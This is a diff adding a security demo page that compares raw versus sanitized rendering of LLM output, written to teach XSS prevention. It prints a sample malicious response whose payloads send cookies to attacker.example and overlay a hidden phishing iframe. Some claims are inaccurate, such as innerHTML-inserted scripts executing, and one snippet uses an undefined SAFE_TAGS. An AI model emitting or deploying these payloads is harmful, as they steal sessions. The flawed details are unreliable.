@@ -1,0 +1,213 @@
+---
+title: "Sanitized vs. Raw Output Toggler"
+description: "Side-by-side comparison of raw LLM output rendered as HTML versus properly sanitized output, demonstrating XSS prevention."
+owaspCategory: llm05
+demoType: comparison
+isSafeToRun: true
+requiresApiKey: false
+interactiveComponents: []
+tags: ["XSS", "sanitization", "comparison", "output-handling"]
+author: "Community"
+publishedAt: "2024-02-05"
+relatedWriteups: []
+---
+
+## Why Code Speaks Louder Than Warnings
+
+Security documentation often warns developers to "sanitize LLM output" without showing what unsanitized output actually looks like in a browser context, and without providing concrete, copy-paste-ready sanitization code. This demo fills that gap with three concrete rendering patterns — unsafe, partially safe, and fully safe — applied to the same malicious LLM output payload.
+
+The example payload below represents output that could realistically be produced by an LLM that has been prompted with malicious user input via prompt injection. All code examples are safe to study; the HTML payload strings are shown as escaped text only.
+
+## The Malicious LLM Output Under Test
+
+Suppose a language model returns the following Markdown string after being prompted by a malicious user:
+
+```
+## Summary of your request
+
+Great question! Here are the results:
+
+![report](x" onerror="alert('XSS: '+document.cookie))
+
+[Download your report](javascript:document.location='https://attacker.example/steal?c='+document.cookie)
+
+<script>fetch('https://attacker.example/exfil?d='+btoa(document.cookie))</script>
+
+<iframe src="https://attacker.example/phish" style="opacity:0;position:absolute;width:100%;height:100%;top:0;left:0"></iframe>
+```
+
+This single response contains four distinct XSS vectors: an `onerror`-based image injection, a `javascript:` protocol link, a raw script tag, and an invisible phishing iframe. Let's see what each rendering pattern does with this.
+
+## Pattern 1: Unsafe — Direct innerHTML (Never Do This)
+
+```javascript
+// UNSAFE — Do not use this pattern
+async function renderLLMResponse(userMessage) {
+  const response = await fetch('/api/chat', {
+    method: 'POST',
+    body: JSON.stringify({ message: userMessage }),
+  });
+  const { content } = await response.json();
+
+  // CRITICAL VULNERABILITY: LLM output treated as trusted HTML
+  document.getElementById('chat-response').innerHTML = content;
+}
+```
+
+**What happens**: All four XSS vectors execute immediately. The `onerror` handler fires when the image fails to load. The `javascript:` link executes on click. The `<script>` tag runs synchronously during DOM insertion (in most browsers). The `<iframe>` renders an invisible overlay that can capture all user interactions.
+
+**Impact**: Full session compromise, cookie theft, phishing overlay, arbitrary JavaScript execution in the victim's browser context.
+
+## Pattern 2: Partially Safe — Marked Without Sanitization
+
+```javascript
+// PARTIALLY SAFE — Marked helps but is NOT sufficient alone
+import { marked } from 'marked';
+
+async function renderLLMResponse(userMessage) {
+  const response = await fetch('/api/chat', { /* ... */ });
+  const { content } = await response.json();
+
+  // marked.js converts Markdown to HTML, but does NOT sanitize
+  const html = marked.parse(content);
+
+  // STILL VULNERABLE: marked passes through raw HTML by default
+  document.getElementById('chat-response').innerHTML = html;
+}
+```
+
+**What happens with default Marked settings**: Marked converts Markdown constructs (headers, lists, code blocks) to HTML and passes raw HTML blocks through unchanged. The `<script>` and `<iframe>` tags survive. The image `onerror` attribute survives. The `javascript:` link survives.
+
+**What `marked` actually helps with**: Marked does HTML-encode some special characters in certain contexts (like within code blocks). It does not provide general XSS protection. The `sanitize` option was removed from Marked in v5.0 specifically because it was creating a false sense of security — a partial blocklist that was routinely bypassed.
+
+**Bottom line**: Marked + innerHTML without a dedicated sanitizer is only marginally safer than raw innerHTML.
+
+## Pattern 3: Safe — Marked + DOMPurify (Recommended)
+
+```javascript
+// SAFE — Correct two-stage pipeline
+import { marked } from 'marked';
+import DOMPurify from 'dompurify';
+
+// Configure a strict DOMPurify profile for LLM output
+const DOMPURIFY_CONFIG = {
+  // Allowlist only the HTML elements needed for Markdown output
+  ALLOWED_TAGS: [
+    'p', 'br', 'strong', 'em', 'del', 'code', 'pre',
+    'ul', 'ol', 'li', 'blockquote',
+    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
+    'table', 'thead', 'tbody', 'tr', 'th', 'td',
+    // Omit 'a' and 'img' unless your use case requires them
+    // If you include them, add URL validation (see below)
+  ],
+  ALLOWED_ATTR: [],       // No attributes — eliminates onerror, onclick, style, etc.
+  FORBID_SCRIPTS: true,   // Belt-and-suspenders: explicitly block <script>
+  FORBID_TAGS: [          // Belt-and-suspenders: explicitly block dangerous tags
+    'script', 'iframe', 'object', 'embed', 'form', 'input', 'button',
+  ],
+  KEEP_CONTENT: false,    // Remove content of forbidden tags entirely
+};
+
+async function renderLLMResponse(userMessage) {
+  const response = await fetch('/api/chat', { /* ... */ });
+  const { content } = await response.json();
+
+  // Stage 1: Parse Markdown to HTML
+  const rawHtml = marked.parse(content);
+
+  // Stage 2: Sanitize the HTML with DOMPurify
+  const safeHtml = DOMPurify.sanitize(rawHtml, DOMPURIFY_CONFIG);
+
+  document.getElementById('chat-response').innerHTML = safeHtml;
+}
+```
+
+**What happens**: DOMPurify strips the `onerror` attribute from the image tag (removing the event handler injection), rewrites the `javascript:` link href to empty or removes the anchor entirely, strips the `<script>` tag completely, and removes the `<iframe>`. The remaining output contains only the text content and safe Markdown formatting.
+
+**Output after sanitization**: The user sees "Summary of your request", "Great question! Here are the results:", a broken image icon (no onerror), the link text "Download your report" with no href, and the raw text of the script and iframe as rendered-as-nothing (removed). The XSS attack is completely neutralized.
+
+## Pattern 4: Links and Images — Safe Allowlisting with URL Validation
+
+If your application requires rendering links and images from LLM output, apply URL validation in addition to DOMPurify:
+
+```javascript
+import DOMPurify from 'dompurify';
+
+// Add a DOMPurify hook to validate href and src attributes
+DOMPurify.addHook('afterSanitizeAttributes', (node) => {
+  // Validate href attributes on anchor tags
+  if (node.tagName === 'A' && node.hasAttribute('href')) {
+    const href = node.getAttribute('href');
+    // Only allow http/https URLs; strip everything else
+    if (!/^https?:\/\//i.test(href)) {
+      node.removeAttribute('href');
+    }
+    // Force links to open in new tab with security attributes
+    node.setAttribute('target', '_blank');
+    node.setAttribute('rel', 'noopener noreferrer');
+  }
+
+  // Validate src attributes on image tags
+  if (node.tagName === 'IMG' && node.hasAttribute('src')) {
+    const src = node.getAttribute('src');
+    if (!/^https?:\/\//i.test(src)) {
+      node.removeAttribute('src');
+    }
+  }
+});
+
+const DOMPURIFY_WITH_LINKS = {
+  ALLOWED_TAGS: [...SAFE_TAGS, 'a', 'img'],
+  ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'target', 'rel'],
+  FORBID_SCRIPTS: true,
+};
+```
+
+## Python Server-Side Equivalent
+
+For server-side rendering or API response sanitization before sending to the client:
+
+```python
+import markdown
+import bleach
+from bleach.linkifier import LinkifyFilter
+
+ALLOWED_TAGS = [
+    'p', 'br', 'strong', 'em', 'del', 'code', 'pre',
+    'ul', 'ol', 'li', 'blockquote',
+    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
+]
+ALLOWED_ATTRIBUTES = {}  # No attributes — eliminates all event handlers
+
+def safe_render_llm_output(llm_output: str) -> str:
+    """
+    Safely render LLM Markdown output as HTML.
+    Strips all unsafe HTML including event handlers, scripts, and iframes.
+    """
+    # Parse Markdown to HTML
+    raw_html = markdown.markdown(
+        llm_output,
+        extensions=['fenced_code', 'tables', 'nl2br'],
+    )
+    # Sanitize using bleach's allowlist approach
+    safe_html = bleach.clean(
+        raw_html,
+        tags=ALLOWED_TAGS,
+        attributes=ALLOWED_ATTRIBUTES,
+        strip=True,          # Remove disallowed tags entirely (not just their attributes)
+        strip_comments=True, # Remove HTML comments (can be used to hide payloads)
+    )
+    return safe_html
+```
+
+## Comparison Summary
+
+| Approach | `<script>` | `onerror` | `javascript:` href | `<iframe>` | Safe to Use? |
+|---|---|---|---|---|---|
+| Raw `innerHTML` | EXECUTES | EXECUTES | EXECUTES | RENDERS | No |
+| `marked` + `innerHTML` | EXECUTES | EXECUTES | EXECUTES | RENDERS | No |
+| `marked` + DOMPurify (no attrs) | Stripped | Stripped | Stripped | Stripped | Yes |
+| `marked` + DOMPurify + URL validation | Stripped | Stripped | Stripped | Stripped | Yes |
+| Python `bleach` (server-side) | Stripped | Stripped | Stripped | Stripped | Yes |
+
+Always sanitize on the server side as well as the client side. Client-side sanitization can be bypassed if attackers find a way to inject content through a path that bypasses your frontend JavaScript.
